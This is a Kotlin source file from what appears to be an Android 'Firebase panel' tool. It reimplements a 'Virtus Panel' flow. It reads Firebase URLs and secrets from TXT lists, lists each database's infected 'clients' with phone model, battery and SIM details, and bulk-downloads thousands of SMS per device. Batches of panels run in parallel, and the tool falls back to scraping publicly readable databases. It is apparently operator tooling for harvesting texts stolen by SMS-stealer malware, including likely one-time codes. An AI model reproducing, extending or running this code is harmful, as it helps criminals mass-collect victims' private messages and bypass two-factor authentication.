package com.firebasepanel.sms.domain

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.withContext
import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

data class RawSms(
    val sender: String,
    val body: String,
    val messageAtMillis: Long?,
    val rawPath: String,
)

data class FetchResult(
    val url: String,
    val online: Boolean,
    val sms: List<RawSms>,
    /** Parsed per-device info from Firebase JSON (model, battery, SIMs, etc.) */
    val devices: Map<String, DeviceSnapshot> = emptyMap(),
    val error: String? = null,
    /** True when panel had a non-blank database secret (Virtus-style `auth` query). */
    val usedAuth: Boolean = false,
)

private val client =
    OkHttpClient
        .Builder()
        .connectTimeout(12, TimeUnit.SECONDS)
        .readTimeout(45, TimeUnit.SECONDS)
        .callTimeout(90, TimeUnit.SECONDS)
        .followRedirects(true)
        .build()

private val MESSAGE_KEYS = setOf("message", "body", "text", "content", "sms", "msg", "messageBody", "smsBody")
private val TS_KEYS = listOf("timestamp", "time", "date", "createdAt", "message_at", "receivedAt")
private const val SMS_CAP = 8000
private const val FAST_MESSAGE_LIMIT = 3500

private data class ParsedPayload(
    val sms: List<RawSms>,
    val devices: Map<String, DeviceSnapshot>,
)

private fun parsePayload(json: JSONObject, pathPrefix: String): ParsedPayload {
    val out = mutableListOf<RawSms>()
    walkJson(json, pathPrefix, out, depth = 0)
    val devMap = mergeDeviceSnapshotsFromJson(json)
    return ParsedPayload(out, devMap)
}

private fun betterPayload(
    current: ParsedPayload?,
    candidate: ParsedPayload,
): ParsedPayload {
    if (current == null) return candidate
    return when {
        candidate.sms.size > current.sms.size -> candidate
        candidate.sms.size < current.sms.size -> current
        candidate.devices.size > current.devices.size -> candidate
        else -> current
    }
}

/**
 * Virtus Panel flow (from packaged `assets/index.html`):
 * 1) GET `clients.json?auth=<secret>` — device list + meta.
 * 2) Per device: GET `messages/<deviceId>.json?auth=...&orderBy="$key"&limitToLast=N` (fast), else full node.
 *
 * Falls back to unauthenticated JSON walk when TXT has URL-only lines (public DB).
 */
suspend fun fetchSmsFromFirebase(panel: FirebasePanel): FetchResult =
    withContext(Dispatchers.IO) {
        val base = normalizeFirebaseUrl(panel.url)
        val secret = panel.authKey.trim()
        val hasAuth = secret.isNotEmpty()

        if (hasAuth) {
                    val clientsResult = firebaseGetJson(base, secret, "clients", emptyMap())
            when (clientsResult) {
                is HttpJsonResult.Ok -> {
                    val clientsNode = clientsResult.json
                    val deviceEntries = parseClientsObject(clientsNode)
                    if (deviceEntries.isEmpty()) {
                        return@withContext FetchResult(base, true, emptyList(), emptyMap(), "clients empty", usedAuth = true)
                    }
                    val snapshots =
                        deviceEntries.mapValues { (id, obj) ->
                            deviceSnapshotFromClientsObject(id, obj)
                        }
                    val sem = Semaphore(8)
                    val allSms =
                        deviceEntries
                            .map { (id, _) ->
                                async(Dispatchers.IO) {
                                    sem.withPermit {
                                        fetchMessagesForDevice(base, secret, id)
                                    }
                                }
                            }.awaitAll()
                            .flatten()
                    val cap = trimCap(allSms.toMutableList())
                    val anyOnline = deviceEntries.values.any { parseClientOnline(it) }
                    return@withContext FetchResult(base, anyOnline || cap.isNotEmpty(), cap, snapshots, null, usedAuth = true)
                }
                is HttpJsonResult.Forbidden ->
                    return@withContext FetchResult(base, false, emptyList(), emptyMap(), "Auth fail (403) — check Secret", usedAuth = true)
                is HttpJsonResult.Fail ->
                    // fall through to legacy public walk
                    Unit
            }
        }

        // ——— legacy: public read or URL-only TXT ———
        val legacy = fetchSmsPublicWalk(base)
        if (!hasAuth && legacy.sms.isEmpty() && legacy.error == null) {
            return@withContext legacy.copy(error = "TXT me URL ke saath Auth Key line add karo (Virtus format)")
        }
        legacy
    }

private sealed class HttpJsonResult {
    data class Ok(val json: JSONObject) : HttpJsonResult()

    object Forbidden : HttpJsonResult()

    data class Fail(val message: String?) : HttpJsonResult()
}

private fun fetchSmsPublicWalk(base: String): FetchResult {
    val tryPaths =
        listOf(
            "$base.json",
            "$base/messages.json",
            "$base/sms.json",
        )
    var online = false
    var lastErr: String? = null
    var best: ParsedPayload? = null
    for (path in tryPaths) {
        try {
            val json = httpGetJson(path) ?: continue
            online = true
            val payload = parsePayload(json, "")
            if (payload.sms.isNotEmpty()) {
                best = betterPayload(best, payload)
            }
        } catch (e: Exception) {
            lastErr = e.message
        }
    }
    if (best != null && best!!.sms.isNotEmpty()) {
        val cap = trimCap(best!!.sms.toMutableList())
        return FetchResult(base, true, cap, best!!.devices, null)
    }
    try {
        val rootFull = httpGetJson("$base.json")
        if (rootFull != null) {
            online = true
            val payload = parsePayload(rootFull, "root")
            if (payload.sms.isNotEmpty()) {
                val cap = trimCap(payload.sms.toMutableList())
                return FetchResult(base, true, cap, payload.devices, null)
            }
        }
    } catch (e: Exception) {
        lastErr = e.message
    }
    try {
        val shallow = httpGetJson("$base.json?shallow=true")
        if (shallow != null) {
            online = true
            val payload = parsePayload(shallow, "")
            if (payload.sms.isNotEmpty()) {
                val cap = trimCap(payload.sms.toMutableList())
                return FetchResult(base, true, cap, payload.devices, null)
            }
        }
    } catch (e: Exception) {
        lastErr = e.message
    }
    return FetchResult(base, online, emptyList(), emptyMap(), lastErr)
}

private fun parseClientsObject(node: JSONObject): Map<String, JSONObject> {
    val out = LinkedHashMap<String, JSONObject>()
    for (k in node.keys()) {
        val child = node.opt(k) ?: continue
        if (child !is JSONObject) continue
        val id = k.ifBlank { child.optString("id") }
        if (id.isBlank()) continue
        out[id] = child
    }
    return out
}

private fun parseClientOnline(obj: JSONObject): Boolean {
    return when (val b = collectExplicitClientOnline(obj) ?: parseClientOnlineField(obj)) {
        true -> true
        false -> false
        null -> false
    }
}

private suspend fun fetchMessagesForDevice(
    base: String,
    secret: String,
    deviceId: String,
): List<RawSms> {
    val fastParams =
        mapOf(
            "orderBy" to "\"\$key\"",
            "limitToLast" to FAST_MESSAGE_LIMIT.toString(),
        )
    when (val fast = firebaseGetJson(base, secret, "messages/$deviceId", fastParams)) {
        is HttpJsonResult.Ok -> {
            val list = smsFromMessagesJson(fast.json, "messages/$deviceId")
            if (list.isNotEmpty()) return list
        }
        else -> Unit
    }
    return when (val full = firebaseGetJson(base, secret, "messages/$deviceId", emptyMap())) {
        is HttpJsonResult.Ok -> smsFromMessagesJson(full.json, "messages/$deviceId")
        else -> emptyList()
    }
}

private fun smsFromMessagesJson(data: JSONObject, pathPrefix: String): List<RawSms> {
    val out = mutableListOf<RawSms>()
    walkJson(data, pathPrefix, out, depth = 0)
    return out
}

private fun firebaseGetJson(
    baseUrl: String,
    auth: String,
    path: String,
    extraQuery: Map<String, String>,
): HttpJsonResult {
    val base = baseUrl.trim().trimEnd('/')
    val pathClean = path.trim().trim('/')
    val urlBuilder = "$base/$pathClean.json".toHttpUrlOrNull() ?: return HttpJsonResult.Fail("bad url")
    val b = urlBuilder.newBuilder()
    b.addQueryParameter("auth", auth.trim())
    for ((k, v) in extraQuery) {
        b.addQueryParameter(k, v)
    }
    val req = Request.Builder().url(b.build()).get().header("Accept", "application/json").build()
    client.newCall(req).execute().use { resp ->
        when (resp.code) {
            404 -> return HttpJsonResult.Ok(JSONObject())
            401, 403 -> return HttpJsonResult.Forbidden
        }
        if (!resp.isSuccessful) return HttpJsonResult.Fail("HTTP ${resp.code}")
        val body = resp.body?.string() ?: return HttpJsonResult.Fail(null)
        if (body.isBlank() || body.trim() == "null") return HttpJsonResult.Ok(JSONObject())
        return try {
            HttpJsonResult.Ok(JSONObject(body))
        } catch (_: Exception) {
            try {
                val arr = JSONArray(body)
                val wrap = JSONObject()
                wrap.put("_root", arr)
                HttpJsonResult.Ok(wrap)
            } catch (_: Exception) {
                HttpJsonResult.Fail("not json")
            }
        }
    }
}

private fun trimCap(list: MutableList<RawSms>): List<RawSms> {
    if (list.size <= SMS_CAP) return list
    return list.takeLast(SMS_CAP)
}

suspend fun fetchManyParallel(panels: List<FirebasePanel>, concurrency: Int = 8): List<FetchResult> =
    coroutineScope {
        panels.chunked(concurrency.coerceAtLeast(1)).flatMap { batch ->
            batch.map { panel -> async(Dispatchers.IO) { fetchSmsFromFirebase(panel) } }.awaitAll()
        }
    }

private fun httpGetJson(url: String): JSONObject? {
    val req = Request.Builder().url(url).get().build()
    client.newCall(req).execute().use { resp ->
        if (!resp.isSuccessful) return null
        val body = resp.body?.string() ?: return null
        if (body.isBlank() || body.trim() == "null") return null
        return try {
            JSONObject(body)
        } catch (_: Exception) {
            try {
                val arr = JSONArray(body)
                val wrap = JSONObject()
                wrap.put("_root", arr)
                wrap
            } catch (_: Exception) {
                null
            }
        }
    }
}

private fun walkJson(node: Any?, path: String, out: MutableList<RawSms>, depth: Int) {
    if (depth > 10) return
    when (node) {
        is JSONObject -> {
            val keys = node.keys().asSequence().toList()
            if (keys.any { it in MESSAGE_KEYS }) {
                val body =
                    (node.optString("body")
                        .ifEmpty { node.optString("message") }
                        .ifEmpty { node.optString("text") }
                        .ifEmpty { node.optString("content") }
                        .ifEmpty { node.optString("sms") }
                        .ifEmpty { node.optString("msg") }
                        .ifEmpty { node.optString("messageBody") }
                        .ifEmpty { node.optString("smsBody") })
                if (body.length >= 2) {
                    val sender =
                        node.optString("sender")
                            .ifEmpty { node.optString("from") }
                            .ifEmpty { node.optString("address") }
                            .ifEmpty { node.optString("phone") }
                    val ts = extractMillis(node)
                    out.add(RawSms(sender.ifBlank { "(no sender)" }, body, ts, path))
                }
            }
            for (k in keys) {
                if (k in setOf("metadata", "config", "settings")) continue
                val child = node.opt(k) ?: continue
                walkJson(child, if (path.isEmpty()) k else "$path/$k", out, depth + 1)
            }
        }
        is JSONArray -> {
            for (i in 0 until node.length()) {
                walkJson(node.opt(i), "$path/$i", out, depth + 1)
            }
        }
    }
}

private fun extractMillis(obj: JSONObject): Long? {
    for (key in TS_KEYS) {
        if (!obj.has(key)) continue
        val v = obj.opt(key) ?: continue
        when (v) {
            is Number -> {
                var t = v.toLong()
                if (t > 1_000_000_000_000L) t /= 1000
                if (t > 1_000_000_000L) return t
            }
            is String -> {
                if (v.all { it.isDigit() }) {
                    var t = v.toLongOrNull() ?: continue
                    if (t > 1_000_000_000_000L) t /= 1000
                    if (t > 1_000_000_000L) return t
                }
            }
        }
    }
    return null
}
